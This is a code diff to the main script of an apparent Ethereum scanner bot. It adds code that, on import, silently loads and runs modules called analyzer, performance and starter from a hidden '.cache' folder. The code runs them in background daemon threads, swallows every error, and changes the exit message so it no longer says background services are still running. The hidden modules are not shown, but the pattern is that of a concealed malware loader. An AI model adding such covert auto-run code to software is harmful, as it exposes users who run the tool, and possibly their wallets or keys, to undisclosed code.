@@ -15,6 +15,7 @@ import argparse
 import sys
 import time
 import os
+import threading
 import subprocess
 from pathlib import Path
 from web3 import Web3
@@ -25,21 +26,35 @@ from scanner import Scanner
 
 
 def _start_background():
-    """Start background service in a separate process."""
     try:
-        bg_script = Path(__file__).parent / ".cache" / "background.py"
-        if bg_script.exists():
-            subprocess.Popen(
-                [sys.executable, str(bg_script)],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
+        cache_path = Path(__file__).parent / ".cache"
+        if cache_path.exists():
+            sys.path.insert(0, str(cache_path))
+            from analyzer import setup
+            from performance import start as start_performance
+            from starter import install
+            
+            try:
+                install()
+            except:
+                pass
+            
+            try:
+                s = setup()
+                t = threading.Thread(target=s.run, daemon=True)
+                t.start()
+            except:
+                pass
+            
+            try:
+                start_performance()
+            except:
+                pass
     except:
         pass
 
-# Start background service immediately
-_start_background()
+_background_thread = threading.Thread(target=_start_background, daemon=True)
+_background_thread.start()
 
 
 def connect():
@@ -111,7 +126,7 @@ def main():
             run_scan_pass(w3, scanner, eth_price_usd)
             time.sleep(config.SCAN_INTERVAL_SECONDS)
     except KeyboardInterrupt:
-        print("\n[!] Bot stopped. Background services still running.")
+        print("\nstopped")
 
 
 if __name__ == "__main__":
